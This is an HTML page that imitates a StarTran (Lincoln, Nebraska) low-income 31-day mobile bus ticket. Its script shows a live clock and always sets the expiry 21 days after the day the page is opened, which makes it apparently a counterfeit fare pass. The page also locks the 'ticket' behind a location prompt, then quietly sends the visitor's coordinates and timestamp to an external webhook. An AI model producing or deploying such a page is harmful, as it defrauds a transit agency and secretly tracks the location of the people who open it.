<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="styles.css">
	<link rel="icon" type="image/x-icon" href="img/favicon.ico">
	<link rel="apple-touch-icon" href="img/bigTokenFavicon.png">
    <title>Token Transit</title>
	<style>
    #overlay {
      position: fixed;
      inset: 0;
      background: #111;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #content {
      display: none;
    }
    button {
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
    }

	</style>
	<-- Created by Richard -->
</head>
<body>
<div id="overlay">
  <h2>This site requires your location</h2>
  <p>Click Yes to continue</p>
  <button id="allow">Yes</button>
</div>
<div id="content">
<div class="ticket-container">
        <div class="close-button">&times;</div>
		<div class="header">
			<div class="instruction"><h2>StarTran</h2>
			Show operator your ticket</div>
		</div>

        <div class="logo-area">
            <div class="pulsing-ring"></div> 
                <div class="outer-circle">
                <div class="inner-circle">
					<img src="img/StarTranLogo.png" alt="StarTran logo" class="round-image"/>
				</div>
            </div>
        </div>

        <div class="clock" id="clock"></div>

        <div class="low-income-tag">
            Low Income
        </div>
	<div class="card">
        <div class="ticket-details">
            Low Income Fixed Route 31-Day
        </div>
        <div class="location">
            Lincoln, NE
        </div>
        <div class="expiration" id="expiryMessage">  
        </div>
	</div>
 </div>
</div>
<script>
		// Get the current date and time
        const today = new Date();
        
        // Create a new date object for the future date
        const expiryDate = new Date(today);

        // Add 21 days
        expiryDate.setDate(today.getDate() + 21);

        // Set the time to 12:00 AM (midnight)
        expiryDate.setHours(0, 0, 0, 0);    
		
// Function to format the date into "Dec 28, 2025" format
function formatExpiryDate(date) {		
        const options = { 
           month: 'short', 
           day: 'numeric', 
           year: 'numeric' 
        };
        // Use toLocaleDateString for a formatted date string
        const dateString = date.toLocaleDateString(undefined, options);
        // Construct the final required string: "Expires [Date] at 12:00 AM"
        return `Expires ${dateString} at 12:00 AM`;		
}
		// Display the final message
		document.getElementById('expiryMessage').textContent = formatExpiryDate(expiryDate);
	
// Function for updating clock on page
function updateClockManualAmPm() {
		const now = new Date();
		let hours = now.getHours();
		let minutes = now.getMinutes();
		let seconds = now.getSeconds();
		let ampm = hours >= 12 ? 'PM' : 'AM';
		// Convert 24-hour time to 12-hour format (e.g., 13 becomes 1)
		hours = hours % 12;
		// Handle the '0' hour (midnight) and '12' hour (noon)
		// If hours is 0 (midnight), set it to 12.
		// If hours is 12 (noon), it stays 12.
		hours = hours === 0 ? 12 : hours; 
		// Hours variable is now already a number and has no leading zero needed
		// Add leading zeros back to minutes and seconds if needed
		minutes = minutes < 10 ? '0' + minutes : minutes;
		seconds = seconds < 10 ? '0' + seconds : seconds;
		// Combine into a single string
		const timeString = hours + ':' + minutes + ':' + seconds + ' ' + ampm;
		document.getElementById("clock").innerHTML = timeString;
}
	setInterval(updateClockManualAmPm, 1000);
	updateClockManualAmPm();
	
  document.addEventListener("DOMContentLoaded", () => {
  console.log("Page loaded, waiting for user consent");

  const overlay = document.getElementById("overlay");
  const content = document.getElementById("content");
  const allowBtn = document.getElementById("allow");

  if (!navigator.geolocation) {
    alert("Geolocation not supported by this browser");
    return;
  }

  allowBtn.addEventListener("click", requestLocation);
});

function requestLocation() {
  navigator.geolocation.getCurrentPosition(
    onLocationGranted,
    onLocationDenied
  );
}

function onLocationGranted(position) {
  // Unlock site
  document.getElementById("overlay").style.display = "none";
  document.getElementById("content").style.display = "block";

  // Send data
  sendToWebhook({
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    timestamp: new Date().toISOString()
  });
}

function onLocationDenied(error) {
  alert("Location permission is required to use this site.");
}

function sendToWebhook(payload) {
  fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(err => console.error("Webhook failed", err));
}

</script>
</body>
</html>
